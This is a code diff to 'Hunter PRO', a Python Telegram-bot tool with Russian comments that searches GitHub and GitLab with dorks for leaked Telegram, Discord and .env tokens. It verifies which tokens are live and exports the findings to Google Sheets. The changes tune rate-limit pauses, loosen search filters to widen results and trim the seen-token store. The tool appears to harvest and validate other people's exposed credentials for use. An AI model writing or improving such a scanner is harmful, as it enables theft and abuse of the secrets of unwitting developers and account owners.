@@ -54,6 +54,8 @@ SEEN_DB_FILE = os.getenv("SEEN_DB_FILE", "seen_tokens.txt")
 LIVE_DB_FILE = os.getenv("LIVE_DB_FILE", "live_tokens.json")
 
 MAX_LOG_LINES = 15
+MAX_SEEN_LINES = 15000
+GITHUB_PACING_SLEEP = 5.5
 TARGET_TIMEOUT = (2.0, 3.5)
 
 if not CONTROL_BOT_TOKEN:
@@ -64,7 +66,7 @@ app = Flask(__name__)
 
 search_session = requests.Session()
 search_session.headers.update({
-    "User-Agent": "HunterPRO-Scanner/8.8 (+https://github.com)",
+    "User-Agent": "HunterPRO-Scanner/8.9 (+https://github.com)",
     "Accept": "application/json",
 })
 
@@ -188,11 +190,11 @@ SKIP_REPOS_SUBSTRINGS = (
 
 TARGET_FILENAMES = [
     "",
+    "",
     "filename:.env",
     "filename:config.py",
     "filename:settings.py",
     "filename:config.json",
-    "filename:.js",
 ]
 
 CONFIG_FILENAMES = [
@@ -200,7 +202,6 @@ CONFIG_FILENAMES = [
     "filename:config.py",
     "filename:settings.py",
     "filename:config.json",
-    "filename:.env.example",
 ]
 
 HUNT_MODES = {
@@ -514,6 +515,13 @@ def append_seen_token(token: str) -> None:
         try:
             with open(SEEN_DB_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{token}\n")
+            if os.path.exists(SEEN_DB_FILE):
+                with open(SEEN_DB_FILE, "r", encoding="utf-8") as f:
+                    lines = [ln.strip() for ln in f if ln.strip()]
+                if len(lines) > MAX_SEEN_LINES:
+                    trimmed = lines[-MAX_SEEN_LINES:]
+                    with open(SEEN_DB_FILE, "w", encoding="utf-8") as f:
+                        f.write("\n".join(trimmed) + "\n")
         except Exception as exc:
             add_log(f"⚠️ Ошибка записи в {SEEN_DB_FILE}: {str(exc)[:30]}")
 
@@ -583,7 +591,7 @@ def _direct_get_json(
     timeout: Tuple[float, float] = TARGET_TIMEOUT,
 ) -> Tuple[int, Optional[Dict[str, Any]], Optional[str]]:
     req_headers = {
-        "User-Agent": "HunterPRO-Verifier/8.8",
+        "User-Agent": "HunterPRO-Verifier/8.9",
         "Accept": "application/json",
         "Connection": "close",
     }
@@ -837,7 +845,7 @@ def manual_check_target(raw_input: str) -> Tuple[str, Optional[Dict[str, Any]]]:
 
 
 # =====================================================================
-# 8. ПОИСК ПО GITHUB И GITLAB
+# 8. ПОИСК ПО GITHUB И GITLAB (ПЕРЕРАБОТАННЫЙ БЛОК ЗАПРОСОВ И ПАУЗ)
 # =====================================================================
 def _sleep_respecting_stop(seconds: float) -> None:
     trace(f"Сон {seconds:.1f}с (с проверкой stop_requested)")
@@ -903,26 +911,21 @@ def extract_findings_from_text(
 
 
 def _build_search_query(hunt_mode: str) -> str:
+    # Без жёсткой связки language + filename, чтобы не резать выдачу в ноль
     if hunt_mode == "tg":
         base = random.choice(TG_DORKS)
-        lang = random.choice(["python", "javascript", "php", "go", "json", ""])
         file_filter = random.choice(TARGET_FILENAMES)
     elif hunt_mode == "dc":
         base = random.choice(DC_DORKS)
-        lang = random.choice(["javascript", "typescript", "python", "json", ""])
         file_filter = random.choice(TARGET_FILENAMES)
     elif hunt_mode == "env":
         base = random.choice(CONFIG_DORKS)
-        lang = ""
         file_filter = random.choice(CONFIG_FILENAMES)
     else:
         base = random.choice(ALL_DORKS)
-        lang = random.choice(["python", "javascript", "typescript", "php", "go", "json", ""])
         file_filter = random.choice(TARGET_FILENAMES)
 
     parts = [base, NOISE_FILTERS, "in:file"]
-    if lang:
-        parts.append(f"language:{lang}")
     if file_filter:
         parts.append(file_filter)
     return " ".join(parts)
@@ -988,11 +991,11 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
             return [], 401
 
         if resp.status_code in (403, 429):
-            wait_sec = 60
+            wait_sec = 65
             if reset_hdr and reset_hdr.isdigit():
-                calc = int(reset_hdr) - int(time.time()) + 2
-                wait_sec = max(5, min(calc, 180))
-            set_status(f"⚠️ Лимит GitHub API. Пауза {wait_sec}с")
+                calc = int(reset_hdr) - int(time.time()) + 3
+                wait_sec = max(15, min(calc, 180))
+            set_status(f"⚠️ Лимит GitHub API ({resp.status_code}). Пауза {wait_sec}с")
             add_log(f"⏳ Rate limit GitHub ({resp.status_code}). Жду {wait_sec} сек.")
             _sleep_respecting_stop(wait_sec)
             return [], resp.status_code
@@ -1030,18 +1033,22 @@ def search_github_dynamic() -> Tuple[List[Dict[str, str]], int]:
                 findings.append(item_found)
 
         add_log(f"📦 GitHub нашёл кандидатов: {len(findings)} (пропущено шумных репо: {skipped_repos})")
-        _sleep_respecting_stop(1.5)
+
+        extra_sleep = 0.0
+        if rem is not None and rem.isdigit() and int(rem) <= 2:
+            extra_sleep = 6.0
+        _sleep_respecting_stop(GITHUB_PACING_SLEEP + extra_sleep)
         trace("search_github_dynamic: конец")
         return findings, 200
 
     except requests.RequestException as exc:
         add_log(f"⚠️ Сетевая ошибка GitHub: {str(exc)[:40]}")
-        _sleep_respecting_stop(4)
+        _sleep_respecting_stop(5)
         return [], 500
     except Exception as exc:
         traceback.print_exc()
         add_log(f"❌ Ошибка парсинга GitHub: {str(exc)[:40]}")
-        _sleep_respecting_stop(4)
+        _sleep_respecting_stop(5)
         return [], 500
 
 
@@ -1511,7 +1518,7 @@ def send_welcome(message: types.Message):
     cur_hunt = HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"])
 
     welcome_text = (
-        "👋 <b>Пульт Hunter PRO v8.8</b>\n"
+        "👋 <b>Пульт Hunter PRO v8.9</b>\n"
         "Сканер токенов и вебхуков с ручной проверкой, досье (вкл. webhook), режимами охоты, фильтрами и экспортом.\n\n"
         f"☁️ Google Sheets: <code>{html.escape(sheets_status)}</code>\n"
         f"🎯 Охота: <code>{html.escape(cur_hunt)}</code>\n"
@@ -2517,7 +2524,7 @@ if __name__ == "__main__":
         faulthandler.enable(all_threads=True)
     except Exception:
         pass
-    trace(f"Старт приложения Hunter PRO v8.8 (PID={os.getpid()})")
+    trace(f"Старт приложения Hunter PRO v8.9 (PID={os.getpid()})")
     if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
         threading.Thread(target=get_google_worksheet, name="SheetsStartup", daemon=True).start()
 
